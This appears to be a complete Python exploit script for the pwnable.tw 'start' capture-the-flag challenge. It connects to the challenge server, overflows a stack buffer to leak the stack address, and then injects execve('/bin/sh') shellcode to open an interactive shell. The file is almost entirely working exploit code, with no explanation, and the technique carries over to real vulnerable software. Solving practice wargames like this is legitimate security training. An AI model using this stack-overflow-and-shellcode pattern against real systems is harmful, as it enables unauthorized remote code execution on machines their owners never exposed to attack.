#!/usr/bin/python
#coding=utf-8
from PwnContext import *
from IPython import embed as ipy
context.terminal = ['gnome-terminal','-x','sh','-c']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=False  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)

uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
def lg(s,addr):
    print '\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr)

context.log_level = 'debug'
ctx.binary = './start'
ctx.remote = ('chall.pwnable.tw',10000)
# ctx.custom_lib_dir = './lib'
# ctx.debug_remote_libc = True
ctx.symbols = {}
ctx.breakpoints = [] 

# rs('gdb',gdbscript='b *0x08048087')
rs('remote')
# dbg()
# dbg('b *0x08048060')
sa(':','a'*0x14+p32(0x08048087))
# ru(':')
esp = uu32(r(4))+20
lg('esp',esp)
shelcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

sl('a'*0x14+p32(esp)+shelcode)
irt()
